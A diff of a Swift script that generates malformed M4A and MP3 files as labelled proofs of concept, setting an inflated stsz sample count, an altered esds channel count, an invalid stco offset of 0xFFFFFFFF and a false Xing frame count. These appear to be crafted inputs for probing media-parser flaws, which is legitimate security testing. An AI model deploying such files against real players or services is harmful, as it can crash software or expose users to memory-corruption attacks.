@@ -2,7 +2,7 @@ import Foundation
 import AVFoundation
 import CoreMedia
 
-// Helper to parse and modify MP4 atoms
+// Helper to parse and modify MP4 atoms for M4A files
 class MP4AtomParser {
     var data: Data
     var position: Int = 0
@@ -45,8 +45,8 @@ class MP4AtomParser {
     }
 }
 
+// PoC 1: Inflate stsz sample count to 8192
 func manipulatePoC1(inputURL: URL, outputURL: URL) throws {
-    // PoC 1: Set stsz sample count to 8192
     let data = try Data(contentsOf: inputURL)
     let parser = MP4AtomParser(data: data)
     
@@ -63,8 +63,8 @@ func manipulatePoC1(inputURL: URL, outputURL: URL) throws {
     print("PoC 1: Set stsz sample count to 8192 in \(outputURL.path)")
 }
 
+// PoC 2: Set esds channel count to 8
 func manipulatePoC2(inputURL: URL, outputURL: URL) throws {
-    // PoC 2: Set esds channel count to 8
     let data = try Data(contentsOf: inputURL)
     let parser = MP4AtomParser(data: data)
     
@@ -79,8 +79,8 @@ func manipulatePoC2(inputURL: URL, outputURL: URL) throws {
     print("PoC 2: Set esds channel count to 8 in \(outputURL.path)")
 }
 
+// PoC 5: Set invalid stco offset to 0xFFFFFFFF
 func manipulatePoC5(inputURL: URL, outputURL: URL) throws {
-    // PoC 5: Set invalid stco offset
     let data = try Data(contentsOf: inputURL)
     let parser = MP4AtomParser(data: data)
     
@@ -97,8 +97,8 @@ func manipulatePoC5(inputURL: URL, outputURL: URL) throws {
     print("PoC 5: Set invalid stco offset in \(outputURL.path)")
 }
 
+// Generate MP3 files independently using AVAssetWriter
 func generateMP3(filename: String, duration: Double, channels: Int, sampleRate: Double, pocNumber: Int) throws {
-    // Generate MP3 using AVAssetWriter
     let outputURL = URL(fileURLWithPath: filename)
     let format = AVAudioFormat(standardFormatWithSampleRate: sampleRate, channels: UInt32(channels))!
     let frameCount = UInt32(duration * sampleRate)
@@ -174,19 +174,23 @@ func generateMP3(filename: String, duration: Double, channels: Int, sampleRate: 
         throw writer.error ?? NSError(domain: "AVAssetWriter", code: -1, userInfo: nil)
     }
     
-    // PoC 3: Add Xing frames=20000 metadata via hex edit
+    // PoC 3: Add Xing frames=20000 metadata
     if pocNumber == 3 {
         var mp3Data = try Data(contentsOf: outputURL)
-        // Simplified Xing header insertion (offset 0x24 for frame count in Xing tag)
-        // Assuming Xing tag exists; real-world would need parsing
-        let frameCountOffset = 0x24 // Approximate, needs validation
-        if mp3Data.count > frameCountOffset + 4 {
-            let frameCountData = UInt32(20000).bigEndian.data
-            mp3Data.replaceSubrange(frameCountOffset..<frameCountOffset+4, with: frameCountData)
-            try mp3Data.write(to: outputURL)
-            print("PoC 3: Set Xing frames to 20000 in \(filename)")
+        // Search for Xing tag (simplified, assumes VBR-like structure)
+        let xingTag = "Xing".data(using: .ascii)!
+        if let range = mp3Data.range(of: xingTag, in: 0..<min(mp3Data.count, 1000)) {
+            let frameCountOffset = range.upperBound + 8 // Skip flags and header
+            if mp3Data.count > frameCountOffset + 4 {
+                let frameCountData = UInt32(20000).bigEndian.data
+                mp3Data.replaceSubrange(frameCountOffset..<frameCountOffset+4, with: frameCountData)
+                try mp3Data.write(to: outputURL)
+                print("PoC 3: Set Xing frames to 20000 in \(filename)")
+            } else {
+                throw NSError(domain: "MP3", code: -1, userInfo: [NSLocalizedDescriptionKey: "Invalid MP3 for Xing edit"])
+            }
         } else {
-            throw NSError(domain: "MP3", code: -1, userInfo: [NSLocalizedDescriptionKey: "Invalid MP3 for Xing edit"])
+            print("Warning: Xing tag not found in \(filename), skipping frames=20000")
         }
     }
 }
